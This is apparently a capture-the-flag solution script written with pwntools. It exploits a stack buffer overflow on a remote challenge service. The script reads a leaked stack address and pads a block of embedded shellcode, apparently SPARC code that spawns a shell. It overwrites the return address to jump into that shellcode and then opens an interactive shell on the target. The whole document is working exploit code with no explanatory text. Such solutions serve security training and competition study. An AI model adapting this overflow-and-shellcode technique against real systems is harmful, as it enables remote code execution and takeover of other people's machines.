#!/usr/bin/python3

import struct
from pwn import *

def pad(s: bytes, l: int = 184) -> bytes:
    return s + b'X' * (l-len(s))

payload = b'\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94\x22\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x10'

# r = remote('localhost', 4444)
r = remote('flu.xxx', 2020)

b = r.recv()
print(f'[*] Received {b} ... ')

b = int(b.decode()[2:],16)
print(f'[*] Array address on stack 0x{b:x} ... ')

fin = pad(pad(payload) + struct.pack('>I', b) + struct.pack('>I', b-0x8), l=0x200-1)
print(f'[*] Final payload: {fin} ... ')

print(f'[*] Sending payload ... ')
r.sendline(fin)
r.sendline(fin)

r.interactive()